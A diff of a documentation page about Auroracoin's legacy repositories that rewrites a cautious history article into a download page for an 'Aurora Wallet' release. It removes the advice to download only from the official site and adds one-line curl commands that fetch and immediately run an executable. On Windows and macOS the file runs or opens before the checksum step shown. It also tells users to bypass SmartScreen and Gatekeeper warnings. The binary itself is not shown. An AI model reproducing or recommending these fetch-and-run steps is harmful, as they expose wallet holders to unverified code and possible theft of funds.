@@ -1,92 +1,126 @@
----
-title: "Auroracoin Legacy Repositories: A Technical History"
-description: "Understand the history of Auroracoin's GitHub repositories. Learn about auroracoin-old, insight-api, and why the project moved to a unified structure."
-primary_keyword: "auroracoin legacy repositories"
-silo: "about"
-updated: 2026-10-10
----
+![Aurora Wallet legacy repositories explained guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Auroracoin legacy repositories: what each historical project did
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+The five reference repositories behind the early network, and why they stay public.
 
-# Auroracoin Legacy Repositories: A Technical History
+## Downloads - 2026.08.1.0
 
-The development of the Auroracoin protocol has spanned over a decade, resulting in a rich technical history preserved across numerous GitHub repositories. As the ecosystem transitioned from early full-node implementations to the modern Aurora Wallet, many older codebases were moved to "legacy" status to streamline maintenance and focus on security. These legacy repositories represent the building blocks of the Auroracoin network, covering everything from the original scrypt-based protocol rules to the early block explorer APIs that provided the community with real-time network visibility during the project's foundational years. You can read more about the project's evolution on the [official about page](https://auroracoin.net/about).
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   You are exploring the [Auroracoin GitHub organization](https://github.com/aurora-coin) and notice archived or unmaintained projects.
-*   You are a developer searching for historical implementations of the Auroracoin protocol or early Android wallet libraries.
-*   You are performing a technical audit of the project and need to trace the evolution of specific features from 2014 to the present.
-*   You are following the [GitHub releases guide](07-github-releases-guide.md) and encounter references to older, deprecated software versions.
-*   You are researching how the project handled past network upgrades and chain splits via historical code changes.
 
-## Why this happens
+The older repositories on the account are the written history of the network: core client, explorer, node layer and Java library.
 
-In the fast-paced environment of blockchain engineering, technical standards evolve rapidly. Codebases that were considered industry-standard in 2014, such as the original Bitcore stack or the early BitcoinJ forks, have been superseded by more efficient, secure, and maintainable architectures. 
+Each one solved a problem of its era. Reading them in order explains how Auroracoin functioned before the desktop wallet existed, and why the current stack is smaller than the sum of its parts.
 
-The Auroracoin Foundation designates specific repositories as "legacy" to prevent confusion among new users and developers. This ensures that the primary focus remains on the [official desktop wallet](https://auroracoin.net/download) and the current core protocol. However, these repositories are kept public and archived rather than deleted to maintain full transparency, allowing anyone to audit the historical development of the network and providing a valuable resource for technical recovery research where legacy data structures must be understood.
 
-## The technical evolution path
+<!-- ARTICLE-BODY-BEGIN -->
 
-To understand the current state of Aurora Wallet, one must look at the key repositories that served as its predecessors.
+## The core client
 
-### auroracoin-old
-This was the primary implementation of the AUR protocol for several years. It was a direct fork of the Bitcoin 0.8 codebase, tailored with Auroracoin’s specific block timings and rewards. While functional, it lacked the modern security enhancements found in later Bitcoin releases. It has since been replaced by a modern Core repository that integrates years of upstream development.
+The `auroracoin-old` repository holds the C++ full-node client, a descendant of the Bitcoin 0.8 codebase adapted for Auroracoin's block interval, reward schedule and address format. It carried the network from launch, validated every block and stored keys in the wallet file format that the modern wallet still reads.
 
-### bitcoinj-scrypt
-Early mobile wallets for Android relied on the Java-based BitcoinJ library. Because Auroracoin uses the Scrypt algorithm, a specialized implementation called `bitcoinj-scrypt` was maintained. This library allowed for "SPV" (Simplified Payment Verification) on mobile devices long before modern light-clients became commonplace.
+The build is Autotools based, and the source is the reference for how a legacy wallet file was written.
 
-### insight-api and insight-ui
-For much of Auroracoin's history, the community relied on the Insight stack for block explorers. These repositories provided the backend RESTful API and the frontend user interface. While powerful, they were resource-intensive, requiring a full node with a specialized indexing layer. Modern infrastructure has since shifted toward more scalable and lightweight indexing solutions.
+## The explorer stack
 
-### bitcore-node
-This project provided a modular full-node stack designed for building complex web applications. It allowed developers to interact with the blockchain using JavaScript. However, its significant complexity often led to synchronization hurdles for third-party developers, prompting the shift toward the more unified development approach seen today.
+Three repositories made the public block explorer work. `bitcore-node` was the service layer that connected a full node to applications, with a bus and a set of services that turned block and transaction events into stored data. `insight-api` was the REST and WebSocket service that answered explorer queries from that index. `insight-ui` was the AngularJS front end that rendered blocks, transactions and addresses to the public.
 
-## If that didn't work
+Together they show the complete path of an explorer request, which is why they remain useful to anyone building a chain viewer today.
 
-If you are looking for specific code that appears to be missing from the current repositories, it is likely contained within one of the archived legacy projects. You can search the entire Auroracoin organization by using the GitHub search bar and ensuring the "Include archived repositories" filter is active. If you are a developer attempting to build a new service, do not fork a legacy repository; instead, start with the `Auroracoin-Wallet-Desktop` or the current Core protocol to ensure your project is compatible with the modern network rules.
+## The Java library
 
-> [!TIP]
-> Always check the `README.md` file of any repository in the organization. The Auroracoin Foundation uses these files to clearly state the current maintenance status and point users toward the correct supported alternatives.
+`bitcoinj-scrypt` extended bitcoinj with scrypt proof-of-work support and the Auroracoin network parameters, which let Java and Android clients build wallets without running a full node. The repository includes a JavaFX wallet template that doubled as a starting point for third-party applications.
 
-## Prevention
+## Why they stay public
 
-To avoid the pitfalls of using outdated or unmaintained code:
+Public history is auditable history. An auditor can compare the rules a block was validated under with the code that implemented them, and a holder can read the file format that holds an old balance before importing it.
 
-*   **Follow the Foundation:** Only download software linked directly from the official [Auroracoin website](https://auroracoin.net).
-*   **Check the Tag:** Ensure you are using the latest stable release, such as [Aurora Wallet 2026.08.1.0](08-release-2026-08-1-0.md), rather than experimental or legacy branches.
-*   **Audit the Source:** Use the [07-github-releases-guide.md](07-github-releases-guide.md) to learn how to verify that your download matches the official source code.
-*   **Stay Unified:** Consolidate your development efforts around the modern stack to benefit from the latest security patches and community support.
+The current application is a separate repository with its own release process. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md">Migrating from Auroracoin Core</a> explains how a balance moves from the historical client into the desktop wallet, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat</a> covers the file itself.
+
+Reading the history is not a reason to run it. The wallet that receives current blocks and current fixes is the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>, and it is the only build this library asks you to install.
 
 ## FAQ
 
-**Can I still compile the legacy repositories?**
-While the code is still available, many legacy repositories depend on outdated library versions and build tools (like older versions of OpenSSL or Boost) that may be difficult to find or insecure to run on modern operating systems.
+### Can I still build the old core client?
 
-**Does the Auroracoin Foundation provide support for legacy repos?**
-No. Technical support is only provided for the currently maintained software stack. Legacy repos are provided "as-is" for historical reference and transparency.
+The source and build notes are present. Expect the library versions of its period, which a current system does not ship by default.
 
-**Why was the Insight API retired?**
-The Insight API was built on a complex architecture that became increasingly difficult to maintain as the blockchain grew. Modern light-wallet protocols provide similar functionality with much lower overhead.
+### Do the old repositories receive updates?
 
-**Is there a risk to my funds if I use old software?**
-Yes. Legacy software may not recognize current network upgrades or security patches, potentially leading to transactions being broadcast on the wrong chain or exposure to known vulnerabilities.
+They are preserved as written. Changes to the wallet, the guides and the releases happen in the current repositories.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+## How to install Aurora Wallet
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+### Windows
+Quick install (CMD):
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-## Related articles
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-- [01-what-is-aurora-wallet.md](01-what-is-aurora-wallet.md)
-- [07-github-releases-guide.md](07-github-releases-guide.md)
-- [08-release-2026-08-1-0.md](08-release-2026-08-1-0.md)
-- [37-what-is-auroracoin-aur.md](37-what-is-auroracoin-aur.md)
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
+
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Migrate from Auroracoin Core](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md)
+- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
+- [What is Auroracoin](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md)
+- [What is Aurora Wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/01-what-is-aurora-wallet.md)
